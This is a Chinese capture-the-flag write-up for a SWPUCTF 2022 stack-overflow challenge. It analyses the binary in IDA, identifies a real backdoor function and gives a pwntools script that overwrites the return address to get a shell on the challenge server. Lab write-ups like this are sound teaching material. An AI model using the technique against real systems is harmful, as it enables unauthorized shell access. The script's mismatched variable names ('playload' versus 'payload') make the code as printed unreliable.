**记录一个有关栈溢出的wp**

# 1.信息获取

![alt text](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image01.png)

使用exeinfo打开得到：无壳、ELF、64位文件

# 2.分析

使用IDA打开
！[alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image02.png)
主函数调用了overflow函数，且该函数内部存在栈溢出漏洞

![alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image03.png)
overflow里的缓冲区为20h

## 寻找后门

![alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image04.png)
gift函数只是用puts输出了字符串 system(‘/bin/sh’)，并没有真正执行系统命令，因此是假后门

![alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image05.png)
fun为真后门，可通过其拿到shell

![alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image06.png)
真正的后门地址为0x401257

# 3.EXP

```python
from pwn import * #引用pwntools库
p = remote("node4.anna.nssctf.cn",25012) #配置nc链接
playload = b'a'*(0x20+8)+p64(0x401257) 
#p64就是8字节打包（针对64位程序），p32是4字节打包（针对32位程序）
p.sendline(payload) #发送攻击字符串
p.interactive() #与程序交互

```

构建playload目的为填充缓冲区与rbp，并将原返回地址覆盖为后门地址
最终可获取Shell并找到flag